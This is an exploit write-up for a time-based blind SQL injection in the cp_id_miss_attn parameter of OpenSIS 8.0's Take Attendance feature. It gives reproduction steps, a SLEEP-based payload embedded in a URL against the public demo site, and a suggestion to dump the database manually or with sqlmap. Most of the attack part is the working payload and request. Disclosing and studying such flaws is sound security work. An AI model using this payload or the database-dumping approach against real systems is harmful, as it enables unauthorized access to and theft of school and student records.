# OpenSIS 8.0 'cp_id_miss_attn' - SQL Injection

A SQL injection vulnerability exists in the Take Attendance functionality of OS4Ed's OpenSIS 8.0. allows an attacker to inject their own SQL query. The cp_id_miss_attn parameter from TakeAttendance.php is vulnerable to SQL injection. An attacker can make an authenticated HTTP request as a user with access to "Take Attendance" functionality to trigger this vulnerability.

Steps to reproduce:

1. Login as "Teacher" and navigate to "Attendance" then "Take Attendance". Capture the request on a web proxy such as BurpSuite

Or just navigate to the URL:

http://demo.opensis.com/Ajax.php?modn...

Vulnerable parameter: cp_id_miss_attn

SQLi payload: r AND (SELECT 1670 FROM (SELECT(SLEEP(10)))VSpq)

URL with the payload: http://demo.opensis.com/Ajax.php?modn... AND (SELECT 1670 FROM (SELECT(SLEEP(10)))VSpq)
&cpv_id_miss_attn=23&ajax=true

2. The page should load depends on the sleep

You can use manual queries to dump database information or use sqlmap.
